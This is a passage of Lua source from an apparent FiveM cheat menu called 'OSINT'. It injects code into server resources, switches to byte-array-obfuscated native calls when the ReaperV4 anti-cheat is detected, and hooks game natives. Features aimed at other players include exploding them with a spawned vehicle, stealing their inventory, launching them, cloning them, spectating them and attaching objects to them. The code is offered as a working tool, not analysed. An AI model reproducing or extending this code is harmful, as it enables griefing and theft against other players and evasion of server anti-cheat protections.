                                    elseif selected == "Army Soldier" then pedModel = "s_m_y_marine_01"
                                    elseif selected == "Marine 1" then pedModel = "s_m_y_marine_02"
                                    elseif selected == "Marine 2" then pedModel = "s_m_y_marine_03"
                                    elseif selected == "Prisoner Male" then pedModel = "s_m_y_prismuscl_01"
                                    elseif selected == "Prison Guard" then pedModel = "s_m_m_prisguard_01"
                                    elseif selected == "Cop Undercover" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Security Guard" then pedModel = "s_m_m_security_01"
                                    elseif selected == "Janitor" then pedModel = "s_m_m_janitor"
                                    elseif selected == "Hobo Male" then pedModel = "a_m_m_tramp_01"
                                    elseif selected == "Hobo Female" then pedModel = "a_f_m_tramp_01"
                                    elseif selected == "Prostitute 1" then pedModel = "s_f_y_hooker_01"
                                    elseif selected == "Prostitute 2" then pedModel = "s_f_y_hooker_02"
                                    elseif selected == "Beach Male" then pedModel = "a_m_y_beach_01"
                                    elseif selected == "Beach Female" then pedModel = "a_f_y_beach_01"
                                    elseif selected == "Tourist Male" then pedModel = "a_m_y_tourist_01"
                                    elseif selected == "Tourist Female" then pedModel = "a_f_y_tourist_01"
                                    elseif selected == "Skater" then pedModel = "a_m_y_skater_01"
                                    elseif selected == "Hipster Male" then pedModel = "a_m_y_hipster_01"
                                    elseif selected == "Hipster Female" then pedModel = "a_f_y_hipster_01"
                                    elseif selected == "Bouncer" then pedModel = "s_m_m_bouncer_01"
                                    elseif selected == "Shopkeeper" then pedModel = "mp_m_shopkeep_01"
                                    elseif selected == "Chef" then pedModel = "s_m_y_chef_01"
                                    elseif selected == "Bartender" then pedModel = "s_m_y_barman_01"
                                    elseif selected == "Waiter" then pedModel = "s_m_y_waiter_01"
                                    elseif selected == "Mechanic" then pedModel = "s_m_y_xmech_02"
                                    elseif selected == "Taxi Driver" then pedModel = "s_m_m_trucker_01"
                                    elseif selected == "Gardener" then pedModel = "s_m_m_gardener_01"
                                    elseif selected == "Farmer" then pedModel = "a_m_m_farmer_01"
                                    elseif selected == "Dock Worker" then pedModel = "s_m_y_dockwork_01"
                                    elseif selected == "Trash Worker" then pedModel = "s_m_y_garbage"
                                    elseif selected == "Postal Worker" then pedModel = "s_m_m_postal_01"
                                    elseif selected == "Bus Driver" then pedModel = "s_m_o_busker_01"
                                    elseif selected == "Pilot" then pedModel = "s_m_m_pilot_01"
                                    elseif selected == "Air Hostess" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Cop Traffic" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "Cop Detective" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Agent" then pedModel = "s_m_m_fiboffice_02"
                                    elseif selected == "Reporter" then pedModel = "s_f_y_scrubs_01"
                                    elseif selected == "News Cameraman" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Hunter" then pedModel = "a_m_m_hillbilly_02"
                                    elseif selected == "Hiker Male" then pedModel = "a_m_m_hiker_01"
                                    elseif selected == "Hiker Female" then pedModel = "a_f_m_hiker_01"
                                    elseif selected == "Golfer Male" then pedModel = "a_m_m_golfer_01"
                                    elseif selected == "Golfer Female" then pedModel = "a_f_m_golfer_01"
                                    elseif selected == "Tennis Player Male" then pedModel = "a_m_m_tennis_01"
                                    elseif selected == "Tennis Player Female" then pedModel = "a_f_m_tennis_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(value))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Animal Peds",
                            scrollType = "onEnter",
                            value = 1,
                            values = { 
                                "Boar", "Cat", "Chicken", "Chimp", "Cow", "Coyote", "Crow", 
                                "Deer", "Dolphin", "Fish", "Hen", "Humpback", "Husky", 
                                "Killer Whale", "Mountain Lion", "Pig", "Pigeon", "Poodle", 
                                "Pug", "Poodle", "Rabbit", "Rat", "Retriever", "Rhesus Monkey",
                                "Rottweiler", "Seagull", "Shepherd", "Stingray", "Tiger Shark", 
                                "Hammerhead Shark", "Cow", "Cat2", "Chickenhawk", "Cormorant",
                                "Coyote2", "Chimp2", "Boar2", "Deer2", "Fish2", "Husky2",
                                "Pug2", "Poodle2", "Retriever2", "Shepherd2", "Rat2", "Rabbit2",
                                "Dolphin2", "Killer Whale2", "Mountain Lion2", "Pig2", "Seagull2",
                                "Stingray2", "Tiger Shark2", "Hammerhead Shark2"
                            },
                            onSelect = function(value)
                                MachoInjectResourceRaw("any", ([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Boar" then
                                        pedModel = "a_c_boar"
                                    elseif selected == "Cat" then
                                        pedModel = "a_c_cat_01"
                                    elseif selected == "Chicken" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Chimp" then
                                        pedModel = "a_c_chimp"
                                    elseif selected == "Cow" then
                                        pedModel = "a_c_cow"
                                    elseif selected == "Coyote" then
                                        pedModel = "a_c_coyote"
                                    elseif selected == "Crow" then
                                        pedModel = "a_c_crow"
                                    elseif selected == "Deer" then
                                        pedModel = "a_c_deer"
                                    elseif selected == "Dolphin" then
                                        pedModel = "a_c_dolphin"
                                    elseif selected == "Fish" then
                                        pedModel = "a_c_fish"
                                    elseif selected == "Hen" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Humpback" then
                                        pedModel = "a_c_humpback"
                                    elseif selected == "Husky" then
                                        pedModel = "a_c_husky"
                                    elseif selected == "Killer Whale" then
                                        pedModel = "a_c_killerwhale"
                                    elseif selected == "Mountain Lion" then
                                        pedModel = "a_c_mtlion"
                                    elseif selected == "Pig" then
                                        pedModel = "a_c_pig"
                                    elseif selected == "Pigeon" then
                                        pedModel = "a_c_pigeon"
                                    elseif selected == "Poodle" then
                                        pedModel = "a_c_poodle"
                                    elseif selected == "Pug" then
                                        pedModel = "a_c_pug"
                                    elseif selected == "Rabbit" then
                                        pedModel = "a_c_rabbit_01"
                                    elseif selected == "Rat" then
                                        pedModel = "a_c_rat"
                                    elseif selected == "Retriever" then
                                        pedModel = "a_c_retriever"
                                    elseif selected == "Rhesus Monkey" then
                                        pedModel = "a_c_rhesus"
                                    elseif selected == "Rottweiler" then
                                        pedModel = "a_c_rottweiler"
                                    elseif selected == "Seagull" then
                                        pedModel = "a_c_seagull"
                                    elseif selected == "Shepherd" then
                                        pedModel = "a_c_shepherd"
                                    elseif selected == "Stingray" then
                                        pedModel = "a_c_stingray"
                                    elseif selected == "Tiger Shark" then
                                        pedModel = "a_c_sharktiger"
                                    elseif selected == "Hammerhead Shark" then
                                        pedModel = "a_c_sharkhammer"
                                    elseif selected == "Chickenhawk" then
                                        pedModel = "a_c_chickenhawk"
                                    elseif selected == "Cormorant" then
                                        pedModel = "a_c_cormorant"
                                    else
                                        pedModel = nil
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid animal selected: " .. tostring(selected))
                                    end
                                ]]):format(value))
                            end
                        },
                    }
                },
            }
        },
        {
            icon = "",
            label = "Server",
            type = "subMenu",
            categories = {
                {
                    label = "List",
                    tabs = {
                        { type = "button", label = "Select Everyone" },
                        { type = "button", label = "Un-Select Everyone" },
                        { type = "button", label = "Clear Selection" },
                        { type = "divider", label = "Nearby Players" },
                    }
                },
                {
                    label = "Safe",
                    tabs = {
                        { type = "button", label = "Teleport to Player", desc = 'This will teleport you to the selected player',
                            onSelect = function()
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player == -1 or not DoesEntityExist(GetPlayerPed(player)) then
                                        self:Notify("error", "OSINT", "There was an error while trying to teleport to that player! (ERR:1)", 3000)
                                        CPlayers[targetPlayer] = nil
                                        OSINT:UpdateListMenu()
                                        return
                                    end

                                    local playerPed = GetPlayerPed(player)
                                    local playerCoords = GetEntityCoords(playerPed)
                                    local playerHeading = GetEntityHeading(playerPed)

                                    SetEntityCoords(PlayerPedId(), playerCoords.x, playerCoords.y, playerCoords.z, false, false, false, false)
                                    SetEntityHeading(PlayerPedId(), playerHeading)
                                    self:Notify("success", "OSINT", ("You have teleported to %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(targetPlayer)), targetPlayer), 3000)
                                else
                                    self:Notify("error", "OSINT", "You must select a player to do this!", 3000)
                                end
                            end
                        },
                        { type = "checkbox", label = "Spectate Player", checked = false, desc = 'This will attempt to Spectate the player',
                            onSelect = function(checked)
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                self:HandleSpectateToggle(targetPlayer, checked)
                            end
                        },
                        { type = "button", label = "Copy Appearance", desc = 'Copy Players Clothing',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end
                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select a player to do this!", 3000)
                                    return
                                end
                                
                                local targetServerId = targetPlayers[1]
                                local ReaperV4Started = GetResourceState("ReaperV4") == 'started' 

                                if ReaperV4Started then
                                    MachoInjectThread(0, "any", "", string.format([[
                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end
                                        local function findClientIdByServerId(sid)
                                            local players = _g(_b("GetActivePlayers"))()
                                            for _, pid in ipairs(players) do
                                                if _g(_b("GetPlayerServerId"))(pid) == sid then
                                                    return pid
                                                end
                                            end
                                            return -1
                                        end
                                        
                                        local function CopyClothing(targetSid)
                                            local clientId = findClientIdByServerId(targetSid)
                                            if clientId == -1 then
                                                print("CLIENT ID NOT FOUND!")
                                                return
                                            end
                                            
                                            local targetPed = _g(_b("GetPlayerPed"))(clientId)
                                            local myPed = _g(_b("PlayerPedId"))()
                                            
                                            if _g(_b("DoesEntityExist"))(targetPed) and _g(_b("DoesEntityExist"))(myPed) then
                                                print("COPYING CLOTHING...")
                                                
                                                -- COPY EVERYTHING - NO CLONING!
                                                _g(_b("SetPedComponentVariation"))(myPed, 1, _g(_b("GetPedDrawableVariation"))(targetPed, 1), _g(_b("GetPedTextureVariation"))(targetPed, 1), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 3, _g(_b("GetPedDrawableVariation"))(targetPed, 3), _g(_b("GetPedTextureVariation"))(targetPed, 3), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 4, _g(_b("GetPedDrawableVariation"))(targetPed, 4), _g(_b("GetPedTextureVariation"))(targetPed, 4), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 6, _g(_b("GetPedDrawableVariation"))(targetPed, 6), _g(_b("GetPedTextureVariation"))(targetPed, 6), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 8, _g(_b("GetPedDrawableVariation"))(targetPed, 8), _g(_b("GetPedTextureVariation"))(targetPed, 8), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 11, _g(_b("GetPedDrawableVariation"))(targetPed, 11), _g(_b("GetPedTextureVariation"))(targetPed, 11), 0)
                                                
                                                -- Copy accessories
                                                _g(_b("SetPedPropIndex"))(myPed, 0, _g(_b("GetPedPropIndex"))(targetPed, 0), _g(_b("GetPedPropTextureIndex"))(targetPed, 0), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 1, _g(_b("GetPedPropIndex"))(targetPed, 1), _g(_b("GetPedPropTextureIndex"))(targetPed, 1), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 2, _g(_b("GetPedPropIndex"))(targetPed, 2), _g(_b("GetPedPropTextureIndex"))(targetPed, 2), true)
                                                
                                                print("CLOTHING COPIED!")
                                            else
                                                print("PED NOT FOUND!")
                                            end
                                        end
                                        
                                        CopyClothing(%d)
                                    ]], targetServerId))
                                else
                                local function _b(str)
                                        local t = {}
                                        for i = 1, #str do t[i] = string.byte(str, i) end
                                        return t
                                    end
                                    local function _d(tbl)
                                        local s = ""
                                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                        return s
                                    end
                                    local function _g(n)
                                        local k = _d(n)
                                        local f = _G[k]
                                        return f
                                    end

                                    local function findClientIdByServerId(sid)
                                        local players = _g(_b("GetActivePlayers"))()
                                        for _, pid in ipairs(players) do
                                            if _g(_b("GetPlayerServerId"))(pid) == sid then
                                                return pid
                                            end
                                        end
                                        return -1
                                    end

                                    local function CopyClothing(targetSid)
                                        local clientId = findClientIdByServerId(targetSid)
                                        if clientId == -1 then
                                            print("^1[ERROR] Client ID not found for Server ID: " .. targetSid .. "^0")
                                            return
                                        end

                                        local targetPed = _g(_b("GetPlayerPed"))(clientId)
                                        local myPed = _g(_b("PlayerPedId"))()

                                        if _g(_b("DoesEntityExist"))(targetPed) and _g(_b("DoesEntityExist"))(myPed) then
                                            print("^2[OSINT] Copying clothing from Server ID: " .. targetSid .. "^0")

                                            -- Copy clothing components
                                            _g(_b("SetPedComponentVariation"))(myPed, 1,  _g(_b("GetPedDrawableVariation"))(targetPed, 1),  _g(_b("GetPedTextureVariation"))(targetPed, 1),  0)
                                            _g(_b("SetPedComponentVariation"))(myPed, 3,  _g(_b("GetPedDrawableVariation"))(targetPed, 3),  _g(_b("GetPedTextureVariation"))(targetPed, 3),  0)
                                            _g(_b("SetPedComponentVariation"))(myPed, 4,  _g(_b("GetPedDrawableVariation"))(targetPed, 4),  _g(_b("GetPedTextureVariation"))(targetPed, 4),  0)
                                            _g(_b("SetPedComponentVariation"))(myPed, 6,  _g(_b("GetPedDrawableVariation"))(targetPed, 6),  _g(_b("GetPedTextureVariation"))(targetPed, 6),  0)
                                            _g(_b("SetPedComponentVariation"))(myPed, 8,  _g(_b("GetPedDrawableVariation"))(targetPed, 8),  _g(_b("GetPedTextureVariation"))(targetPed, 8),  0)
                                            _g(_b("SetPedComponentVariation"))(myPed, 11, _g(_b("GetPedDrawableVariation"))(targetPed, 11), _g(_b("GetPedTextureVariation"))(targetPed, 11), 0)

                                            -- Copy props (hats, glasses, earrings)
                                            _g(_b("SetPedPropIndex"))(myPed, 0, _g(_b("GetPedPropIndex"))(targetPed, 0), _g(_b("GetPedPropTextureIndex"))(targetPed, 0), true)
                                            _g(_b("SetPedPropIndex"))(myPed, 1, _g(_b("GetPedPropIndex"))(targetPed, 1), _g(_b("GetPedPropTextureIndex"))(targetPed, 1), true)
                                            _g(_b("SetPedPropIndex"))(myPed, 2, _g(_b("GetPedPropIndex"))(targetPed, 2), _g(_b("GetPedPropTextureIndex"))(targetPed, 2), true)

                                            print("^2[OSINT] Clothing copied successfully!^0")
                                        else
                                            print("^3[WARNING] Target or local ped does not exist.^0")
                                        end
                                    end

                                    -- Execute directly
                                    CopyClothing(targetServerId)
                                end

                                self:Notify("success", "OSINT", "Copied clothing!", 5000)
                            end
                        },
                        { type = "button", label = "Launch Player", desc = 'This will attempt to launch the player into the sky',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select a player to do this!", 3000)
                                    return
                                end

                                self:HandleLaunchPlayer(targetPlayers)
                                self:Notify("success", "OSINT", "Attempting to TEST", 5000)                            
                            end
                        },
                    }
                },
                {
                    label = "Risky",
                    tabs = {
                        { type = "button", label = "Explode Player", desc = 'This will attempt to explode the player using a vehicle',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select a player to do this!", 3000)
                                    return
                                end

                                for _, sid in ipairs(targetPlayers) do
                                    local targetPlayer = sid
                                    local player = GetPlayerFromServerId(sid)
                                    if player == -1 or not DoesEntityExist(GetPlayerPed(player)) then
                                        self:Notify("error", "OSINT", "You must select a player to do this!", 3000)
                                        CPlayers[sid] = nil
                                        return
                                    else
                                        local script = [[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                local func = _G[decode(n)]
                                                if not func then
                                                    return nil
                                                end
                                                return func
                                            end
                                            local function wait(n)
                                                local waitFunc = g({87,97,105,116}) -- "Wait"
                                                if not waitFunc then
                                                    return
                                                end
                                                return waitFunc(n)
                                            end

                                            local vehicleName = decode({109,97,110,99,104,101,122}) -- "manchez"
                                            local requestModel = g({82,101,113,117,101,115,116,77,111,100,101,108})
                                            if not requestModel then return end
                                            requestModel(vehicleName)

                                            local hasModelLoaded = g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})
                                            if hasModelLoaded then
                                                local attempts = 0
                                                while not hasModelLoaded(vehicleName) and attempts < 20 do
                                                    wait(500)
                                                    attempts = attempts + 1
                                                end
                                                if attempts >= 20 then
                                                    return
                                                end
                                            end

                                            local getPlayerFromServerId = g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})
                                            if not getPlayerFromServerId then return end
                                            local targetPlayer = getPlayerFromServerId(]] .. tostring(targetPlayer) .. [[)
                                            if targetPlayer == -1 then
                                                return
                                            end

                                            local getPlayerPed = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                            if not getPlayerPed then return end
                                            local targetPed = getPlayerPed(targetPlayer)
                                            if not targetPed or targetPed == 0 then
                                                return
                                            end

                                            local localPlayerPed = getPlayerPed(-1) -- Get local player ped
                                            if not localPlayerPed or localPlayerPed == 0 then
                                                return
                                            end

                                            local getEntityCoords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})
                                            local getEntityHeading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})
                                            local setEntityHealth = g({83,101,116,69,110,116,105,116,121,72,101,97,108,116,104})
                                            if not getEntityCoords or not getEntityHeading then return end
                                            local targetPos = getEntityCoords(targetPed)
                                            local heading = getEntityHeading(targetPed)

                                            local giveWeapon = g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})
                                            local setCurrentWeapon = g({83,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110})
                                            local getHashKey = g({71,101,116,72,97,115,104,75,101,121})
                                            local shootBullet = g({83,104,111,111,116,83,105,110,103,108,101,66,117,108,108,101,116,66,101,116,119,101,101,110,67,111,111,114,100,115})
                                            local removeWeapon = g({82,101,109,111,118,101,87,101,97,112,111,110,70,114,111,109,80,101,100})
                                            local setMissionEntity = g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})

                                            local pistolHash = getHashKey(decode({87,69,65,80,79,78,95,65,80,80,73,83,84,79,76}))
                                            giveWeapon(localPlayerPed, pistolHash, 200, false, true)
                                            setCurrentWeapon(localPlayerPed, pistolHash, true)

                                            wait(1000) -- Wait 3 seconds before spawning vehicle

                                            local createVehicle = g({67,114,101,97,116,101,86,101,104,105,99,108,101})
                                            if not createVehicle then return end
                                            local vehicleSpawnPos = {x = targetPos.x + 2.0, y = targetPos.y, z = targetPos.z + 0.2} -- Offset 5 units, slight Z lift
                                            local vehicle = createVehicle(vehicleName, vehicleSpawnPos.x, vehicleSpawnPos.y, vehicleSpawnPos.z, heading, true, true)
                                            if not vehicle or vehicle == 0 then
                                                return
                                            end

                                            if setMissionEntity then
                                                setMissionEntity(vehicle, true, true)
                                            end
                                            if setEntityHealth then
                                                setEntityHealth(vehicle, 10) -- Set low health for easy explosion
                                            end

                                            for i = 1, 60 do
                                                local vehicleCoords = getEntityCoords(vehicle) -- Get updated vehicle coords each time
                                                shootBullet(
                                                    targetPos.x, targetPos.y, targetPos.z + 1.0, -- Start near target ped
                                                    vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 0.3, -- Aim at vehicle center (tighter offset)
                                                    2000.0, true, pistolHash, localPlayerPed, true, false, 2000.0 -- Higher speed for accuracy
                                                )
                                                wait(1) -- Slightly slower shooting for stability
                                            end

                                            removeWeapon(localPlayerPed, pistolHash)
                                        ]]
                                        MachoInjectResourceRaw("any", script, targetPlayer)
                                        self:Notify("success", "OSINT", "Attempting to Explode Player", 5000)
                                    end
                                end

                                OSINT:UpdateListMenu()
                            end
                        },
                        { type = "button", label = "Steal Inventory", desc = 'This will attempt to open the selected players inventory',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select a player to do this!", 3000)
                                    return
                                end

                                self:HandleTakeInventory(targetPlayers)
                                self:Notify("success", "OSINT", "Attempting to steal inventory", 5000)
                            end
                        },
                        { type = "divider", label = "Ped Options" },
                        { type = "button", label = "Clone Player",
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select a player to do this!", 3000)
                                    return
                                end

                                self:HandleClonePlayer(targetPlayers)
                                self:Notify("success", "OSINT", "Cloned Player", 5000)
                            end
                        },
                        { type = "button", label = "Attack Clone Player",
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select a player to do this!", 3000)
                                    return
                                end

                                self:HandleAttackClonePlayer(targetPlayers)
                                self:Notify("success", "OSINT", "Cloned Player", 5000)
                            end
                        },
                        { type = "divider", label = "Vehicle Options" },
                        {
                            type = "scrollable", 
                            label = "Attach Vehicle", 
                            scrollType = "onEnter", 
                            value = 1, 
                            values = { 
                                "bmx", "sanchez", "adder", "blista", "sultan", "faggio", "bati", "pcj",
                                "oppressor", "maverick", "buzzard", "cargobob", "t20", "comet", "kuruma",
                                "zentorno", "entityxf", "carbonizzare", "elegy", "massacro", "vagner",
                                "nightshark", "banshee", "feltzer2", "ruston", "bullet", "elegy2"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end
                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select a player to do this!", 3000)
                                    return
                                end
                                OSINT:AttachSelectedVehicle(targetPlayers, value)
                                self:Notify("success", "OSINT", "Vehicle Attached to " .. #targetPlayers .. " Player(s)", 5000)
                            end
                        },
                        { type = "divider", label = "Object Options" },
                        {
                            type = "scrollable",
                            label = "Vehicle Object",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "bmx", "sanchez", "adder", "blista", "sultan", "faggio", "bati", "pcj",
                                "oppressor", "maverick", "buzzard", "cargobob", "t20", "comet",
                                "zentorno", "tampa", "nightshark", "kuruma", "buffalo", "massacro",
                                "ferrari", "comet2", "issi2", "vindicator", "baller", "baller2"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select at least one player!", 3000)
                                    return
                                end

                                function OSINT:GetSelectedObjectModel()
                                    return value
                                end

                                OSINT:SpawnSelectedObject(targetPlayers)
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Attach Prop",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "prop_barrel_02a", "prop_cone_float_1", "prop_chair_01a", "prop_boombox_01",
                                "prop_tool_broom", "prop_golf_ball", "prop_laptop_01a", "prop_trafficcone_01a",
                                "prop_pizza_box_01", "prop_mb_cargo_01a", "prop_ld_crate_01a", "prop_ld_fueldoor",
                                "prop_ld_greenscreen_01", "prop_ld_shovel", "prop_snow_bottle", "prop_snow_locker_01",
                                "prop_dummy_01", "prop_dummy_02"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select at least one player!", 3000)
                                    return
                                end

                                function OSINT:GetSelectedObjectModel()
                                    return value
                                end

                                OSINT:SpawnSelectedObject(targetPlayers)

                                self:Notify("success", "OSINT", "Spawned object '" .. tostring(value) .. "' for " .. #targetPlayers .. " player(s).", 5000)
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Attach Furniture",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "prop_table_01", "prop_table_02", "prop_table_03", "prop_chair_02",
                                "prop_chair_03", "prop_chair_04a", "prop_sofa_01", "prop_sofa_02",
                                "prop_sofa_03", "prop_bed_01", "prop_bed_02", "prop_lamp_01",
                                "prop_lamp_02", "prop_lamp_03", "prop_couch_01", "prop_couch_02",
                                "prop_tv_01", "prop_tv_02", "prop_tv_03", "prop_computer_01",
                                "prop_computer_02", "prop_monitor_01", "prop_monitor_02"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select at least one player!", 3000)
                                    return
                                end

                                function OSINT:GetSelectedObjectModel()
                                    return value
                                end

                                OSINT:SpawnSelectedObject(targetPlayers)
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Attach Misc",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "prop_beer_bottle", "prop_soda_cup", "prop_papercup_01", "prop_cup_coffee_01",
                                "prop_champ_flute", "prop_cs_burger_01", "prop_cs_burger_02", "prop_cs_hotdog_01",
                                "prop_cs_pizza_01", "prop_cs_sandwich_01", "prop_cs_juice_01"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "OSINT", "You must select at least one player!", 3000)
                                    return
                                end

                                function OSINT:GetSelectedObjectModel()
                                    return value
                                end

                                OSINT:SpawnSelectedObject(targetPlayers)

                                self:Notify("success", "OSINT", "Spawned object '" .. tostring(value) .. "' for " .. #targetPlayers .. " player(s).", 5000)
                            end
                        },

                    }
                },
                {
                    label = "Vehicle",
                    tabs = {
                        { type = "button", label = "Kick From Vehicle",
                            onSelect = function()
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player == -1 then
                                        self:Notify("error", "OSINT", "There was an error while trying to kick the player from their vehicle! (ERR:1)", 3000)
                                        CPlayers[targetPlayer] = nil
                                        OSINT:UpdateListMenu()
                                        return
                                    end

                                    if not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(player))) then
                                        self:Notify("error", "OSINT", "There was an error while trying to kick the player from their vehicle! (ERR:2)", 3000)
                                        return
                                    end

                                    if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                                        for i = 1, 2 do
                                        MachoInjectResourceRaw(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
